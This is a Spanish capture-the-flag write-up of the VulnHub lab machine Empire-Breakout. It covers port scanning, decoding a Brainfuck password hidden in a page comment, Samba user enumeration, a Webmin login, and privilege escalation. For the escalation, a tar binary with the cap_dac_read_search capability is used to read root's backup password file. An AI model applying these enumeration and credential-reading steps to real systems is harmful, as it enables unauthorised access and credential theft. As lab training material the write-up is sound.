---
Titulo: Empire-Breakout
Fecha: 18-11-2025
categoria:
  - Capabilities
Dificultad_oficial: Fácil/Media
Dificultad_percibida: Facil/Medio
Estado: Terminado
---
## 1. Descripción del reto
No se nada de este reto, de hecho es el primero que hago de la plataforma de vulnhub

## 2. Enumeración / Reconocimiento
Vamos a empezar con un escaneo variado, tanto de análisis como de información
```shell
┌──(kali㉿Odon)-[~]
└─$ nmap -sS -sV -p- --min-rate 5000 --open 192.168.48.135                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 05:21 EST
Nmap scan report for 192.168.48.135
Host is up (0.00041s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.07 seconds
 
┌──(kali㉿Odon)-[~]
└─$ nmap -sS -sV -sC -p 80,139,445,10000,20000 --min-rate 5000 --open 192.168.48.135
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 05:24 EST
Nmap scan report for 192.168.48.135
Host is up (0.00058s latency).

PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
|_http-server-header: MiniServ/1.981
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-server-header: MiniServ/1.830
|_http-title: 200 &mdash; Document follows

Host script results:
| smb2-time: 
|   date: 2025-11-18T10:24:49
|_  start_date: N/A
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.96 seconds
```

Vale, aquí vemos información relevante como el típico puerto 80, después también vemos puertos curiosos como el 10000 y el 20000 y después un samba que no parece tener mucha información. Bueno, vamos a irnos a la página web.

![[Pasted image 20251118142637.png]]

Un apache de toda la vida pero para debian, siempre es bueno mirar el código de estas páginas porque puede contener alguna que otra sorpresa.

```txt
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.

-->
```

Dicho y hecho, aquí hay parece que hay algún tipo de contraseña, pienso esto por "my access", voy a intentar descifrarlo.

Vale, lo conseguí identifique el patrón, es uno que se denomina "brainf_ck", lo lleve a descifrar y me dio como resultado: ".2uqPEfj3D<P'a-3". Por lo que parece que es la contraseña, ahora nos toca buscar un usuario... Haber de donde lo saco ahora...

>[!info] Me puse a mirar con diferentes herramientas como whatweb, gobuster, searchsploit y smbclient. Haber si había algún directorio oculto o algún exploit en especifico para esa versión y no encontré nada (Pero estuve a punto de una versión vulnerable :( ), o inclusive alguna carpeta con algún archivo oculto, pero nada funciono.

>[!tip] Entre todo esto me puse a ver que había en el puerto 10k y 20k y hay un formulario que necesito contraseña y usuario

Vale poniéndome a buscar entre mis writeUP pasados, información en internet, etc... encontré que puedo usar la herramienta "enum4linux" que me dio el siguiente output:
```shell
┌──(kali㉿Odon)-[/opt/WhatWeb]
└─$ enum4linux 192.168.48.135 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Nov 18 06:07:05 2025

 =========================================( Target Information )=========================================
Target ........... 192.168.48.135
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

[...]

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''  S-1-22-1-1000 Unix User\cyber (Local User)                                    

[...]
enum4linux complete on Tue Nov 18 06:07:42 2025
```

Y "vualá" ya tenemos un usuario y contraseña que poner en en formulario del puerto 20k.

## 3. Explotación / Desarrollo
Entre y en la parte baja me aparecía un icono de terminal y lo aproveche lo mejor que pude (También pude haber hecho una reverse shell o una backdoor y así tener persistencia en el sistema), ya una vez dentro del sistema me puse a investigar.

```shell
[cyber@breakout ~]$ whoami
cyber
[cyber@breakout ~]$ ls
tar
user.txt
[cyber@breakout ~]$ cat user.txt
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
[cyber@breakout ~]$ sudo -l
bash: line 1: sudo: command not found
[...]
[cyber@breakout ~]$ cat tar 
Cannot establish connection to the host.
[cyber@breakout ~]$ ls -la
total 568
drwxr-xr-x  8 cyber cyber   4096 Oct 20  2021 .
drwxr-xr-x  3 root  root    4096 Oct 19  2021 ..
-rw-------  1 cyber cyber      0 Oct 20  2021 .bash_history
-rw-r--r--  1 cyber cyber    220 Oct 19  2021 .bash_logout
-rw-r--r--  1 cyber cyber   3526 Oct 19  2021 .bashrc
drwxr-xr-x  2 cyber cyber   4096 Oct 19  2021 .filemin
drwx------  2 cyber cyber   4096 Oct 19  2021 .gnupg
drwxr-xr-x  3 cyber cyber   4096 Oct 19  2021 .local
-rw-r--r--  1 cyber cyber    807 Oct 19  2021 .profile
drwx------  2 cyber cyber   4096 Oct 19  2021 .spamassassin
-rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar
drwxr-xr-x  2 cyber cyber   4096 Oct 20  2021 .tmp
drwx------ 16 cyber cyber   4096 Oct 19  2021 .usermin
-rw-r--r--  1 cyber cyber     48 Oct 19  2021 user.txt
[cyber@breakout ~]$ cat tar 0.0.0.0 
Cannot establish connection to the host.
[cyber@breakout ~]$ cat /etc/crontab
[...]
[cyber@breakout ~]$ find / -type f -perm -04000 -ls 2>/dev/null
[...]
[...]
[cyber@breakout ~]$ getcap -r tar
tar cap_dac_read_search=ep
[cyber@breakout ~]$ getcap -r / 2>/dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
[cyber@breakout ~]$ ls -la /usr/bin/ping
-rwxr-xr-x 1 root root 77432 Feb  2  2021 /usr/bin/ping
[cyber@breakout ~]$ ls -la /home/cyber/tar
-rwxr-xr-x 1 root root 531928 Oct 19  2021 /home/cyber/tar

[cyber@breakout ~]$ getcap -r tar
tar cap_dac_read_search=ep
[cyber@breakout ~]$ ./tar -cf pass.tar /var/backups/.old_pass.bak
./tar: Removing leading `/' from member names
[cyber@breakout ~]$ ./tar -xf pass.tar
[cyber@breakout ~]$ cat pass.tar
var/backups/.old_pass.bak0000600000000000000000000000002114134001114014303 0ustar  rootrootTs&4&YurgtRX(=~h
```

>[!info] Aquí tengo que hacer un inciso y es que sabia que la cosa iba por la "capabilities", pero no sabia bien como usarla a mi favor, por lo que tuve que buscar información.

Ahora solo me faltaba conectarme con las credenciales de root y coger la bandera
```shell
[root@breakout ~]$ woami
sh: 1: woami: not found
[root@breakout ~]$ whoami
root
[root@breakout ~]$ cat /root/rOOt.txt
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}

Author: Icex64 & Empire Cybersecurity
```
## 4. Notas y aprendizajes

- Punto fuerte: Aprender como enumerar y usar mejor las capabilities
    
- Dificultad encontrada: No saber usar las capabilities a mi favor
    
- Conceptos nuevos aprendidos: Aprender a usar la capabilities a mi favor y buscar información oficial.